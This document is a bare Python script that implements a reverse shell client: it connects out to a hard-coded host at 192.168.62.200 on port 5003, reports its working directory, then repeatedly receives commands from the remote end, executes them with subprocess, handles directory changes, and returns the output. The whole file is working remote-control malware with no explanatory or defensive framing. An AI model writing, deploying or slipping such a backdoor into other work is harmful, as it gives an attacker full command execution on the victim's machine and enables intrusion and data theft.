#!/usr/bin/env python3
import socket
import os
import subprocess
import sys

SERVER_HOST = '192.168.62.200'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 

try:
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))
except socket.error as e:
    print(e)
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = "Done."
        
    else:
        output = subprocess.getoutput(command)
        if output == "":
            output = "Done."
    message = f"{output}"
    s.send(message.encode())
s.close()
